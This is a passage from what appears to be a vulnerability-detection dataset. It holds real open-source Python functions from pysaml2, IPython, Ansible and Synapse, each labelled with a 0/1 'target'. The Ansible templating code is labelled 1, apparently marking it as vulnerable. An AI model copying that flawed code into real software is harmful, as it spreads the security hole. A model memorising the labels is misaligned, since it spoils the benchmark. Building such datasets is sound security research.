Type=\"http://www.w3.org/2001/04/xmlenc#Element\"\n# xmlns=\"http://www.w3.org/2001/04/xmlenc#\">\n#     <EncryptionMethod Algorithm=\"http://www.w3\n# .org/2001/04/xmlenc#tripledes-cbc\"/>\n#     <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n#       <EncryptedKey Id=\"EK\" xmlns=\"http://www.w3.org/2001/04/xmlenc#\">\n#         <EncryptionMethod Algorithm=\"http://www.w3\n# .org/2001/04/xmlenc#rsa-1_5\"/>\n#         <ds:KeyInfo xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\n#           <ds:KeyName>my-rsa-key</ds:KeyName>\n#         </ds:KeyInfo>\n#         <CipherData>\n#           <CipherValue>\n#           </CipherValue>\n#         </CipherData>\n#         <ReferenceList>\n#           <DataReference URI=\"#ED\"/>\n#         </ReferenceList>\n#       </EncryptedKey>\n#     </ds:KeyInfo>\n#     <CipherData>\n#       <CipherValue>\n#       </CipherValue>\n#     </CipherData>\n# </EncryptedData>\n\n\ndef pre_encryption_part(msg_enc=TRIPLE_DES_CBC, key_enc=RSA_1_5, key_name='my-rsa-key'):\n    \"\"\"\n\n    :param msg_enc:\n    :param key_enc:\n    :param key_name:\n    :return:\n    \"\"\"\n    msg_encryption_method = EncryptionMethod(algorithm=msg_enc)\n    key_encryption_method = EncryptionMethod(algorithm=key_enc)\n    encrypted_key = EncryptedKey(\n            id='EK',\n            encryption_method=key_encryption_method,\n            key_info=ds.KeyInfo(\n                key_name=ds.KeyName(text=key_name)),\n            cipher_data=CipherData(\n                cipher_value=CipherValue(text='')))\n    key_info = ds.KeyInfo(encrypted_key=encrypted_key)\n    encrypted_data = EncryptedData(\n        id='ED',\n        type='http://www.w3.org/2001/04/xmlenc#Element',\n        encryption_method=msg_encryption_method,\n        key_info=key_info,\n        cipher_data=CipherData(cipher_value=CipherValue(text='')))\n    return encrypted_data\n\n\ndef pre_encrypt_assertion(response):\n    \"\"\"\n    Move the assertion to within a encrypted_assertion\n    :param response: The response with one assertion\n    :return: The response but now with the assertion within an\n        encrypted_assertion.\n    \"\"\"\n    assertion = response.assertion\n    response.assertion = None\n    response.encrypted_assertion = EncryptedAssertion()\n    if assertion is not None:\n        if isinstance(assertion, list):\n            response.encrypted_assertion.add_extension_elements(assertion)\n        else:\n            response.encrypted_assertion.add_extension_element(assertion)\n    return response\n\n\ndef response_factory(sign=False, encrypt=False, sign_alg=None, digest_alg=None,\n                     **kwargs):\n    response = samlp.Response(id=sid(), version=VERSION,\n                              issue_instant=instant())\n\n    if sign:\n        response.signature = pre_signature_part(\n            kwargs['id'], sign_alg=sign_alg, digest_alg=digest_alg)\n    if encrypt:\n        pass\n\n    for key, val in kwargs.items():\n        setattr(response, key, val)\n\n    return response\n\n\nif __name__ == '__main__':\n    import argparse\n\n    parser = argparse.ArgumentParser()\n    parser.add_argument('-s', '--list-sigalgs', dest='listsigalgs',\n            action='store_true',\n            help='List implemented signature algorithms')\n    args = parser.parse_args()\n\n    if args.listsigalgs:\n        print('\\n'.join([key for key, value in SIGNER_ALGS.items()]))\n", "target": 0}
{"idx": 1001, "func": "\"\"\"Base Tornado handlers for the notebook.\n\nAuthors:\n\n* Brian Granger\n\"\"\"\n\n#-----------------------------------------------------------------------------\n#  Copyright (C) 2011  The IPython Development Team\n#\n#  Distributed under the terms of the BSD License.  The full license is in\n#  the file COPYING, distributed as part of this software.\n#-----------------------------------------------------------------------------\n\n#-----------------------------------------------------------------------------\n# Imports\n#-----------------------------------------------------------------------------\n\n\nimport functools\nimport json\nimport logging\nimport os\nimport re\nimport sys\nimport traceback\ntry:\n    # py3\n    from http.client import responses\nexcept ImportError:\n    from httplib import responses\ntry:\n    from urllib.parse import urlparse # Py 3\nexcept ImportError:\n    from urlparse import urlparse # Py 2\n\nfrom jinja2 import TemplateNotFound\nfrom tornado import web\n\ntry:\n    from tornado.log import app_log\nexcept ImportError:\n    app_log = logging.getLogger()\n\nfrom IPython.config import Application\nfrom IPython.utils.path import filefind\nfrom IPython.utils.py3compat import string_types\nfrom IPython.html.utils import is_hidden\n\n#-----------------------------------------------------------------------------\n# Top-level handlers\n#-----------------------------------------------------------------------------\nnon_alphanum = re.compile(r'[^A-Za-z0-9]')\n\nclass AuthenticatedHandler(web.RequestHandler):\n    \"\"\"A RequestHandler with an authenticated user.\"\"\"\n\n    def set_default_headers(self):\n        headers = self.settings.get('headers', {})\n\n        if \"X-Frame-Options\" not in headers:\n            headers[\"X-Frame-Options\"] = \"SAMEORIGIN\"\n\n        for header_name,value in headers.items() :\n            try:\n                self.set_header(header_name, value)\n            except Exception:\n                # tornado raise Exception (not a subclass)\n                # if method is unsupported (websocket and Access-Control-Allow-Origin\n                # for example, so just ignore)\n                pass\n    \n    def clear_login_cookie(self):\n        self.clear_cookie(self.cookie_name)\n    \n    def get_current_user(self):\n        user_id = self.get_secure_cookie(self.cookie_name)\n        # For now the user_id should not return empty, but it could eventually\n        if user_id == '':\n            user_id = 'anonymous'\n        if user_id is None:\n            # prevent extra Invalid cookie sig warnings:\n            self.clear_login_cookie()\n            if not self.login_available:\n                user_id = 'anonymous'\n        return user_id\n\n    @property\n    def cookie_name(self):\n        default_cookie_name = non_alphanum.sub('-', 'username-{}'.format(\n            self.request.host\n        ))\n        return self.settings.get('cookie_name', default_cookie_name)\n    \n    @property\n    def password(self):\n        \"\"\"our password\"\"\"\n        return self.settings.get('password', '')\n    \n    @property\n    def logged_in(self):\n        \"\"\"Is a user currently logged in?\n\n        \"\"\"\n        user = self.get_current_user()\n        return (user and not user == 'anonymous')\n\n    @property\n    def login_available(self):\n        \"\"\"May a user proceed to log in?\n\n        This returns True if login capability is available, irrespective of\n        whether the user is already logged in or not.\n\n        \"\"\"\n        return bool(self.settings.get('password', ''))\n\n\nclass IPythonHandler(AuthenticatedHandler):\n    \"\"\"IPython-specific extensions to authenticated handling\n    \n    Mostly property shortcuts to IPython-specific settings.\n    \"\"\"\n    \n    @property\n    def config(self):\n        return self.settings.get('config', None)\n    \n    @property\n    def log(self):\n        \"\"\"use the IPython log by default, falling back on tornado's logger\"\"\"\n        if Application.initialized():\n            return Application.instance().log\n        else:\n            return app_log\n    \n    #---------------------------------------------------------------\n    # URLs\n    #---------------------------------------------------------------\n    \n    @property\n    def mathjax_url(self):\n        return self.settings.get('mathjax_url', '')\n    \n    @property\n    def base_url(self):\n        return self.settings.get('base_url', '/')\n    \n    #---------------------------------------------------------------\n    # Manager objects\n    #---------------------------------------------------------------\n    \n    @property\n    def kernel_manager(self):\n        return self.settings['kernel_manager']\n\n    @property\n    def notebook_manager(self):\n        return self.settings['notebook_manager']\n    \n    @property\n    def cluster_manager(self):\n        return self.settings['cluster_manager']\n    \n    @property\n    def session_manager(self):\n        return self.settings['session_manager']\n    \n    @property\n    def project_dir(self):\n        return self.notebook_manager.notebook_dir\n    \n    #---------------------------------------------------------------\n    # CORS\n    #---------------------------------------------------------------\n\n    @property\n    def allow_origin(self):\n        \"\"\"Normal Access-Control-Allow-Origin\"\"\"\n        return self.settings.get('allow_origin', '')\n\n    @property\n    def allow_origin_pat(self):\n        \"\"\"Regular expression version of allow_origin\"\"\"\n        return self.settings.get('allow_origin_pat', None)\n\n    @property\n    def allow_credentials(self):\n        \"\"\"Whether to set Access-Control-Allow-Credentials\"\"\"\n        return self.settings.get('allow_credentials', False)\n\n    def set_default_headers(self):\n        \"\"\"Add CORS headers, if defined\"\"\"\n        super(IPythonHandler, self).set_default_headers()\n        if self.allow_origin:\n            self.set_header(\"Access-Control-Allow-Origin\", self.allow_origin)\n        elif self.allow_origin_pat:\n            origin = self.get_origin()\n            if origin and self.allow_origin_pat.match(origin):\n                self.set_header(\"Access-Control-Allow-Origin\", origin)\n        if self.allow_credentials:\n            self.set_header(\"Access-Control-Allow-Credentials\", 'true')\n\n    def get_origin(self):\n        # Handle WebSocket Origin naming convention differences\n        # The difference between version 8 and 13 is that in 8 the\n        # client sends a \"Sec-Websocket-Origin\" header and in 13 it's\n        # simply \"Origin\".\n        if \"Origin\" in self.request.headers:\n            origin = self.request.headers.get(\"Origin\")\n        else:\n            origin = self.request.headers.get(\"Sec-Websocket-Origin\", None)\n        return origin\n\n    def check_origin_api(self):\n        \"\"\"Check Origin for cross-site API requests.\n        \n        Copied from WebSocket with changes:\n        \n        - allow unspecified host/origin (e.g. scripts)\n        \"\"\"\n        if self.allow_origin == '*':\n            return True\n\n        host = self.request.headers.get(\"Host\")\n        origin = self.request.headers.get(\"Origin\")\n\n        # If no header is provided, assume it comes from a script/curl.\n        # We are only concerned with cross-site browser stuff here.\n        if origin is None or host is None:\n            return True\n        \n        origin = origin.lower()\n        origin_host = urlparse(origin).netloc\n        \n        # OK if origin matches host\n        if origin_host == host:\n            return True\n        \n        # Check CORS headers\n        if self.allow_origin:\n            allow = self.allow_origin == origin\n        elif self.allow_origin_pat:\n            allow = bool(self.allow_origin_pat.match(origin))\n        else:\n            # No CORS headers deny the request\n            allow = False\n        if not allow:\n            self.log.warn(\"Blocking Cross Origin API request.  Origin: %s, Host: %s\",\n                origin, host,\n            )\n        return allow\n\n    def prepare(self):\n        if not self.check_origin_api():\n            raise web.HTTPError(404)\n        return super(IPythonHandler, self).prepare()\n\n    #---------------------------------------------------------------\n    # template rendering\n    #---------------------------------------------------------------\n    \n    def get_template(self, name):\n        \"\"\"Return the jinja template object for a given name\"\"\"\n        return self.settings['jinja2_env'].get_template(name)\n    \n    def render_template(self, name, **ns):\n        ns.update(self.template_namespace)\n        template = self.get_template(name)\n        return template.render(**ns)\n    \n    @property\n    def template_namespace(self):\n        return dict(\n            base_url=self.base_url,\n            logged_in=self.logged_in,\n            login_available=self.login_available,\n            static_url=self.static_url,\n        )\n    \n    def get_json_body(self):\n        \"\"\"Return the body of the request as JSON data.\"\"\"\n        if not self.request.body:\n            return None\n        # Do we need to call body.decode('utf-8') here?\n        body = self.request.body.strip().decode(u'utf-8')\n        try:\n            model = json.loads(body)\n        except Exception:\n            self.log.debug(\"Bad JSON: %r\", body)\n            self.log.error(\"Couldn't parse JSON\", exc_info=True)\n            raise web.HTTPError(400, u'Invalid JSON in body of request')\n        return model\n\n    def write_error(self, status_code, **kwargs):\n        \"\"\"render custom error pages\"\"\"\n        exc_info = kwargs.get('exc_info')\n        message = ''\n        status_message = responses.get(status_code, 'Unknown HTTP Error')\n        if exc_info:\n            exception = exc_info[1]\n            # get the custom message, if defined\n            try:\n                message = exception.log_message % exception.args\n            except Exception:\n                pass\n            \n            # construct the custom reason, if defined\n            reason = getattr(exception, 'reason', '')\n            if reason:\n                status_message = reason\n        \n        # build template namespace\n        ns = dict(\n            status_code=status_code,\n            status_message=status_message,\n            message=message,\n            exception=exception,\n        )\n        \n        self.set_header('Content-Type', 'text/html')\n        # render the template\n        try:\n            html = self.render_template('%s.html' % status_code, **ns)\n        except TemplateNotFound:\n            self.log.debug(\"No template for %d\", status_code)\n            html = self.render_template('error.html', **ns)\n        \n        self.write(html)\n        \n\n\nclass Template404(IPythonHandler):\n    \"\"\"Render our 404 template\"\"\"\n    def prepare(self):\n        raise web.HTTPError(404)\n\n\nclass AuthenticatedFileHandler(IPythonHandler, web.StaticFileHandler):\n    \"\"\"static files should only be accessible when logged in\"\"\"\n\n    @web.authenticated\n    def get(self, path):\n        if os.path.splitext(path)[1] == '.ipynb':\n            name = os.path.basename(path)\n            self.set_header('Content-Type', 'application/json')\n            self.set_header('Content-Disposition','attachment; filename=\"%s\"' % name)\n        \n        return web.StaticFileHandler.get(self, path)\n    \n    def compute_etag(self):\n        return None\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"Validate and return the absolute path.\n        \n        Requires tornado 3.1\n        \n        Adding to tornado's own handling, forbids the serving of hidden files.\n        \"\"\"\n        abs_path = super(AuthenticatedFileHandler, self).validate_absolute_path(root, absolute_path)\n        abs_root = os.path.abspath(root)\n        if is_hidden(abs_path, abs_root):\n            self.log.info(\"Refusing to serve hidden file, via 404 Error\")\n            raise web.HTTPError(404)\n        return abs_path\n\n\ndef json_errors(method):\n    \"\"\"Decorate methods with this to return GitHub style JSON errors.\n    \n    This should be used on any JSON API on any handler method that can raise HTTPErrors.\n    \n    This will grab the latest HTTPError exception using sys.exc_info\n    and then:\n    \n    1. Set the HTTP status code based on the HTTPError\n    2. Create and return a JSON body with a message field describing\n       the error in a human readable form.\n    \"\"\"\n    @functools.wraps(method)\n    def wrapper(self, *args, **kwargs):\n        try:\n            result = method(self, *args, **kwargs)\n        except web.HTTPError as e:\n            status = e.status_code\n            message = e.log_message\n            self.log.warn(message)\n            self.set_status(e.status_code)\n            self.set_header('Content-Type', 'application/json')\n            self.finish(json.dumps(dict(message=message)))\n        except Exception:\n            self.log.error(\"Unhandled error in API request\", exc_info=True)\n            status = 500\n            message = \"Unknown server error\"\n            t, value, tb = sys.exc_info()\n            self.set_status(status)\n            tb_text = ''.join(traceback.format_exception(t, value, tb))\n            reply = dict(message=message, traceback=tb_text)\n            self.set_header('Content-Type', 'application/json')\n            self.finish(json.dumps(reply))\n        else:\n            return result\n    return wrapper\n\n\n\n#-----------------------------------------------------------------------------\n# File handler\n#-----------------------------------------------------------------------------\n\n# to minimize subclass changes:\nHTTPError = web.HTTPError\n\nclass FileFindHandler(web.StaticFileHandler):\n    \"\"\"subclass of StaticFileHandler for serving files from a search path\"\"\"\n    \n    # cache search results, don't search for files more than once\n    _static_paths = {}\n    \n    def initialize(self, path, default_filename=None):\n        if isinstance(path, string_types):\n            path = [path]\n        \n        self.root = tuple(\n            os.path.abspath(os.path.expanduser(p)) + os.sep for p in path\n        )\n        self.default_filename = default_filename\n    \n    def compute_etag(self):\n        return None\n    \n    @classmethod\n    def get_absolute_path(cls, roots, path):\n        \"\"\"locate a file to serve on our static file search path\"\"\"\n        with cls._lock:\n            if path in cls._static_paths:\n                return cls._static_paths[path]\n            try:\n                abspath = os.path.abspath(filefind(path, roots))\n            except IOError:\n                # IOError means not found\n                return ''\n            \n            cls._static_paths[path] = abspath\n            return abspath\n    \n    def validate_absolute_path(self, root, absolute_path):\n        \"\"\"check if the file should be served (raises 404, 403, etc.)\"\"\"\n        if absolute_path == '':\n            raise web.HTTPError(404)\n        \n        for root in self.root:\n            if (absolute_path + os.sep).startswith(root):\n                break\n        \n        return super(FileFindHandler, self).validate_absolute_path(root, absolute_path)\n\n\nclass TrailingSlashHandler(web.RequestHandler):\n    \"\"\"Simple redirect handler that strips trailing slashes\n    \n    This should be the first, highest priority handler.\n    \"\"\"\n    \n    SUPPORTED_METHODS = ['GET']\n    \n    def get(self):\n        self.redirect(self.request.uri.rstrip('/'))\n\n#-----------------------------------------------------------------------------\n# URL pattern fragments for re-use\n#-----------------------------------------------------------------------------\n\npath_regex = r\"(?P<path>(?:/.*)*)\"\nnotebook_name_regex = r\"(?P<name>[^/]+\\.ipynb)\"\nnotebook_path_regex = \"%s/%s\" % (path_regex, notebook_name_regex)\n\n#-----------------------------------------------------------------------------\n# URL to handler mappings\n#-----------------------------------------------------------------------------\n\n\ndefault_handlers = [\n    (r\".*/\", TrailingSlashHandler)\n]\n", "target": 0}
{"idx": 1002, "func": "# (c) 2012, Michael DeHaan <michael.dehaan@gmail.com>\n#\n# This file is part of Ansible\n#\n# Ansible is free software: you can redistribute it and/or modify\n# it under the terms of the GNU General Public License as published by\n# the Free Software Foundation, either version 3 of the License, or\n# (at your option) any later version.\n#\n# Ansible is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.\n\nimport os\nimport re\nimport codecs\nimport jinja2\nfrom jinja2.runtime import StrictUndefined\nfrom jinja2.exceptions import TemplateSyntaxError\nimport yaml\nimport json\nfrom ansible import errors\nimport ansible.constants as C\nimport time\nimport subprocess\nimport datetime\nimport pwd\nimport ast\nimport traceback\n\nfrom ansible.utils.string_functions import count_newlines_from_end\n\nclass Globals(object):\n\n    FILTERS = None\n\n    def __init__(self):\n        pass\n\ndef _get_filters():\n    ''' return filter plugin instances '''\n\n    if Globals.FILTERS is not None:\n        return Globals.FILTERS\n\n    from ansible import utils\n    plugins = [ x for x in utils.plugins.filter_loader.all()]\n    filters = {}\n    for fp in plugins:\n        filters.update(fp.filters())\n    Globals.FILTERS = filters\n\n    return Globals.FILTERS\n\ndef _get_extensions():\n    ''' return jinja2 extensions to load '''\n\n    '''\n    if some extensions are set via jinja_extensions in ansible.cfg, we try\n    to load them with the jinja environment\n    '''\n    jinja_exts = []\n    if C.DEFAULT_JINJA2_EXTENSIONS:\n        '''\n        Let's make sure the configuration directive doesn't contain spaces\n        and split extensions in an array\n        '''\n        jinja_exts = C.DEFAULT_JINJA2_EXTENSIONS.replace(\" \", \"\").split(',')\n\n    return jinja_exts\n\nclass Flags:\n    LEGACY_TEMPLATE_WARNING = False\n\n# TODO: refactor this file\n\nFILTER_PLUGINS = None\n_LISTRE = re.compile(r\"(\\w+)\\[(\\d+)\\]\")\nJINJA2_OVERRIDE='#jinja2:'\n\ndef lookup(name, *args, **kwargs):\n    from ansible import utils\n    instance = utils.plugins.lookup_loader.get(name.lower(), basedir=kwargs.get('basedir',None))\n    vars = kwargs.get('vars', None)\n\n    if instance is not None:\n        # safely catch run failures per #5059\n        try:\n            ran = instance.run(*args, inject=vars, **kwargs)\n        except errors.AnsibleError:\n            # Plugin raised this on purpose\n            raise\n        except Exception, e:\n            ran = None\n        if ran:\n            ran = \",\".join(ran)\n        return ran\n    else:\n        raise errors.AnsibleError(\"lookup plugin (%s) not found\" % name)\n\ndef template(basedir, varname, vars, lookup_fatal=True, depth=0, expand_lists=True, convert_bare=False, fail_on_undefined=False, filter_fatal=True):\n    ''' templates a data structure by traversing it and substituting for other data structures '''\n    from ansible import utils\n\n    try:\n        if convert_bare and isinstance(varname, basestring):\n            first_part = varname.split(\".\")[0].split(\"[\")[0]\n            if first_part in vars and '{{' not in varname and '$' not in varname:\n                varname = \"{{%s}}\" % varname\n    \n        if isinstance(varname, basestring):\n            if '{{' in varname or '{%' in varname:\n                varname = template_from_string(basedir, varname, vars, fail_on_undefined)\n\n                if (varname.startswith(\"{\") and not varname.startswith(\"{{\")) or varname.startswith(\"[\"):\n                    eval_results = utils.safe_eval(varname, locals=vars, include_exceptions=True)\n                    if eval_results[1] is None:\n                        varname = eval_results[0]\n\n            return varname\n    \n        elif isinstance(varname, (list, tuple)):\n            return [template(basedir, v, vars, lookup_fatal, depth, expand_lists, fail_on_undefined=fail_on_undefined) for v in varname]\n        elif isinstance(varname, dict):\n            d = {}\n            for (k, v) in varname.iteritems():\n                d[k] = template(basedir, v, vars, lookup_fatal, depth, expand_lists, fail_on_undefined=fail_on_undefined)\n            return d\n        else:\n            return varname\n    except errors.AnsibleFilterError:\n        if filter_fatal:\n            raise\n        else:\n            return varname\n\n\nclass _jinja2_vars(object):\n    '''\n    Helper class to template all variable content before jinja2 sees it.\n    This is done by hijacking the variable storage that jinja2 uses, and\n    overriding __contains__ and __getitem__ to look like a dict. Added bonus\n    is avoiding duplicating the large hashes that inject tends to be.\n    To facilitate using builtin jinja2 things like range, globals are handled\n    here.\n    extras is a list of locals to also search for variables.\n    '''\n\n    def __init__(self, basedir, vars, globals, fail_on_undefined, *extras):\n        self.basedir = basedir\n        self.vars = vars\n        self.globals = globals\n        self.fail_on_undefined = fail_on_undefined\n        self.extras = extras\n\n    def __contains__(self, k):\n        if k in self.vars:\n            return True\n        for i in self.extras:\n            if k in i:\n                return True\n        if k in self.globals:\n            return True\n        return False\n\n    def __getitem__(self, varname):\n        if varname not in self.vars:\n            for i in self.extras:\n                if varname in i:\n                    return i[varname]\n            if varname in self.globals:\n                return self.globals[varname]\n            else:\n                raise KeyError(\"undefined variable: %s\" % varname)\n        var = self.vars[varname]\n        # HostVars is special, return it as-is\n        if isinstance(var, dict) and type(var) != dict:\n            return var\n        else:\n            return template(self.basedir, var, self.vars, fail_on_undefined=self.fail_on_undefined)\n\n    def add_locals(self, locals):\n        '''\n        If locals are provided, create a copy of self containing those\n        locals in addition to what is already in this variable proxy.\n        '''\n        if locals is None:\n            return self\n        return _jinja2_vars(self.basedir, self.vars, self.globals, self.fail_on_undefined, locals, *self.extras)\n\nclass J2Template(jinja2.environment.Template):\n    '''\n    This class prevents Jinja2 from running _jinja2_vars through dict()\n    Without this, {% include %} and similar will create new contexts unlike\n    the special one created in template_from_file. This ensures they are all\n    alike, with the exception of potential locals.\n    '''\n    def new_context(self, vars=None, shared=False, locals=None):\n        return jinja2.runtime.Context(self.environment, vars.add_locals(locals), self.name, self.blocks)\n\ndef template_from_file(basedir, path, vars, vault_password=None):\n    ''' run a file through the templating engine '''\n\n    fail_on_undefined = C.DEFAULT_UNDEFINED_VAR_BEHAVIOR\n\n    from ansible import utils\n    realpath = utils.path_dwim(basedir, path)\n    loader=jinja2.FileSystemLoader([basedir,os.path.dirname(realpath)])\n\n    def my_lookup(*args, **kwargs):\n        kwargs['vars'] = vars\n        return lookup(*args, basedir=basedir, **kwargs)\n    def my_finalize(thing):\n        return thing if thing is not None else ''\n\n    environment = jinja2.Environment(loader=loader, trim_blocks=True, extensions=_get_extensions())\n    environment.filters.update(_get_filters())\n    environment.globals['lookup'] = my_lookup\n    environment.globals['finalize'] = my_finalize\n    if fail_on_undefined:\n        environment.undefined = StrictUndefined\n\n    try:\n        data = codecs.open(realpath, encoding=\"utf8\").read()\n    except UnicodeDecodeError:\n        raise errors.AnsibleError(\"unable to process as utf-8: %s\" % realpath)\n    except:\n        raise errors.AnsibleError(\"unable to read %s\" % realpath)\n\n\n    # Get jinja env overrides from template\n    if data.startswith(JINJA2_OVERRIDE):\n        eol = data.find('\\n')\n        line = data[len(JINJA2_OVERRIDE):eol]\n        data = data[eol+1:]\n        for pair in line.split(','):\n            (key,val) = pair.split(':')\n            setattr(environment,key.strip(),ast.literal_eval(val.strip()))\n\n    environment.template_class = J2Template\n    try:\n        t = environment.from_string(data)\n    except TemplateSyntaxError, e:\n        # Throw an exception which includes a more user friendly error message\n        values = {'name': realpath, 'lineno': e.lineno, 'error': str(e)}\n        msg = 'file: %(name)s, line number: %(lineno)s, error: %(error)s' % \\\n               values\n        error = errors.AnsibleError(msg)\n        raise error\n    vars = vars.copy()\n    try:\n        template_uid = pwd.getpwuid(os.stat(realpath).st_uid).pw_name\n    except:\n        template_uid = os.stat(realpath).st_uid\n    vars['template_host']   = os.uname()[1]\n    vars['template_path']   = realpath\n    vars['template_mtime']  = datetime.datetime.fromtimestamp(os.path.getmtime(realpath))\n    vars['template_uid']    = template_uid\n    vars['template_fullpath'] = os.path.abspath(realpath)\n    vars['template_run_date'] = datetime.datetime.now()\n\n    managed_default = C.DEFAULT_MANAGED_STR\n    managed_str = managed_default.format(\n        host = vars['template_host'],\n        uid  = vars['template_uid'],\n        file = vars['template_path']\n    )\n    vars['ansible_managed'] = time.strftime(\n        managed_str,\n        time.localtime(os.path.getmtime(realpath))\n    )\n\n    # This line performs deep Jinja2 magic that uses the _jinja2_vars object for vars\n    # Ideally, this could use some API where setting shared=True and the object won't get\n    # passed through dict(o), but I have not found that yet.\n    try:\n        res = jinja2.utils.concat(t.root_render_func(t.new_context(_jinja2_vars(basedir, vars, t.globals, fail_on_undefined), shared=True)))\n    except jinja2.exceptions.UndefinedError, e:\n        raise errors.AnsibleUndefinedVariable(\"One or more undefined variables: %s\" % str(e))\n    except jinja2.exceptions.TemplateNotFound, e:\n        # Throw an exception which includes a more user friendly error message\n        # This likely will happen for included sub-template. Not that besides\n        # pure \"file not found\" it may happen due to Jinja2's \"security\"\n        # checks on path.\n        values = {'name': realpath, 'subname': str(e)}\n        msg = 'file: %(name)s, error: Cannot find/not allowed to load (include) template %(subname)s' % \\\n               values\n        error = errors.AnsibleError(msg)\n        raise error\n\n    # The low level calls above do not preserve the newline\n    # characters at the end of the input data, so we use the\n    # calculate the difference in newlines and append them \n    # to the resulting output for parity\n    res_newlines  = count_newlines_from_end(res)\n    data_newlines = count_newlines_from_end(data)\n    if data_newlines > res_newlines:\n        res += '\\n' * (data_newlines - res_newlines)\n\n    if isinstance(res, unicode):\n        # do not try to re-template a unicode string\n        result = res\n    else:\n        result = template(basedir, res, vars)\n\n    return result\n\ndef template_from_string(basedir, data, vars, fail_on_undefined=False):\n    ''' run a string through the (Jinja2) templating engine '''\n\n    try:\n        if type(data) == str:\n            data = unicode(data, 'utf-8')\n\n        def my_finalize(thing):\n            return thing if thing is not None else ''\n\n        environment = jinja2.Environment(trim_blocks=True, undefined=StrictUndefined, extensions=_get_extensions(), finalize=my_finalize)\n        environment.filters.update(_get_filters())\n        environment.template_class = J2Template\n\n        if '_original_file' in vars:\n            basedir = os.path.dirname(vars['_original_file'])\n            filesdir = os.path.abspath(os.path.join(basedir, '..', 'files'))\n            if os.path.exists(filesdir):\n                basedir = filesdir\n\n        # 6227\n        if isinstance(data, unicode):\n            try:\n                data = data.decode('utf-8')\n            except UnicodeEncodeError, e:\n                pass\n\n        try:\n            t = environment.from_string(data)\n        except Exception, e:\n            if 'recursion' in str(e):\n                raise errors.AnsibleError(\"recursive loop detected in template string: %s\" % data)\n            else:\n                return data\n\n        def my_lookup(*args, **kwargs):\n            kwargs['vars'] = vars\n            return lookup(*args, basedir=basedir, **kwargs)\n\n        t.globals['lookup'] = my_lookup\n        t.globals['finalize'] = my_finalize\n        jvars =_jinja2_vars(basedir, vars, t.globals, fail_on_undefined)\n        new_context = t.new_context(jvars, shared=True)\n        rf = t.root_render_func(new_context)\n        try:\n            res = jinja2.utils.concat(rf)\n        except TypeError, te:\n            if 'StrictUndefined' in str(te):\n                raise errors.AnsibleUndefinedVariable(\n                    \"Unable to look up a name or access an attribute in template string. \" + \\\n                    \"Make sure your variable name does not contain invalid characters like '-'.\"\n                )\n            else:\n                raise errors.AnsibleError(\"an unexpected type error occured. Error was %s\" % te)\n        return res\n    except (jinja2.exceptions.UndefinedError, errors.AnsibleUndefinedVariable):\n        if fail_on_undefined:\n            raise\n        else:\n            return data\n\n", "target": 1}
{"idx": 1003, "func": "# -*- coding: utf-8 -*-\n# Copyright 2014-2016 OpenMarket Ltd\n# Copyright 2018 New Vector Ltd\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\nimport logging\nimport urllib.parse\nfrom io import BytesIO\nfrom typing import (\n    TYPE_CHECKING,\n    Any,\n    BinaryIO,\n    Dict,\n    Iterable,\n    List,\n    Mapping,\n    Optional,\n    Sequence,\n    Tuple,\n    Union,\n)\n\nimport treq\nfrom canonicaljson import encode_canonical_json\nfrom netaddr import IPAddress, IPSet\nfrom prometheus_client import Counter\nfrom zope.interface import implementer, provider\n\nfrom OpenSSL import SSL\nfrom OpenSSL.SSL import VERIFY_NONE\nfrom twisted.internet import defer, error as twisted_error, protocol, ssl\nfrom twisted.internet.interfaces import (\n    IAddress,\n    IHostResolution,\n    IReactorPluggableNameResolver,\n    IResolutionReceiver,\n)\nfrom twisted.internet.task import Cooperator\nfrom twisted.python.failure import Failure\nfrom twisted.web._newclient import ResponseDone\nfrom twisted.web.client import (\n    Agent,\n    HTTPConnectionPool,\n    ResponseNeverReceived,\n    readBody,\n)\nfrom twisted.web.http import PotentialDataLoss\nfrom twisted.web.http_headers import Headers\nfrom twisted.web.iweb import IAgent, IBodyProducer, IResponse\n\nfrom synapse.api.errors import Codes, HttpResponseException, SynapseError\nfrom synapse.http import QuieterFileBodyProducer, RequestTimedOutError, redact_uri\nfrom synapse.http.proxyagent import ProxyAgent\nfrom synapse.logging.context import make_deferred_yieldable\nfrom synapse.logging.opentracing import set_tag, start_active_span, tags\nfrom synapse.util import json_decoder\nfrom synapse.util.async_helpers import timeout_deferred\n\nif TYPE_CHECKING:\n    from synapse.app.homeserver import HomeServer\n\nlogger = logging.getLogger(__name__)\n\noutgoing_requests_counter = Counter(\"synapse_http_client_requests\", \"\", [\"method\"])\nincoming_responses_counter = Counter(\n    \"synapse_http_client_responses\", \"\", [\"method\", \"code\"]\n)\n\n# the type of the headers list, to be passed to the t.w.h.Headers.\n# Actually we can mix str and bytes keys, but Mapping treats 'key' as invariant so\n# we simplify.\nRawHeaders = Union[Mapping[str, \"RawHeaderValue\"], Mapping[bytes, \"RawHeaderValue\"]]\n\n# the value actually has to be a List, but List is invariant so we can't specify that\n# the entries can either be Lists or bytes.\nRawHeaderValue = Sequence[Union[str, bytes]]\n\n# the type of the query params, to be passed into `urlencode`\nQueryParamValue = Union[str, bytes, Iterable[Union[str, bytes]]]\nQueryParams = Union[Mapping[str, QueryParamValue], Mapping[bytes, QueryParamValue]]\n\n\ndef check_against_blacklist(\n    ip_address: IPAddress, ip_whitelist: Optional[IPSet], ip_blacklist: IPSet\n) -> bool:\n    \"\"\"\n    Compares an IP address to allowed and disallowed IP sets.\n\n    Args:\n        ip_address: The IP address to check\n        ip_whitelist: Allowed IP addresses.\n        ip_blacklist: Disallowed IP addresses.\n\n    Returns:\n        True if the IP address is in the blacklist and not in the whitelist.\n    \"\"\"\n    if ip_address in ip_blacklist:\n        if ip_whitelist is None or ip_address not in ip_whitelist:\n            return True\n    return False\n\n\n_EPSILON = 0.00000001\n\n\ndef 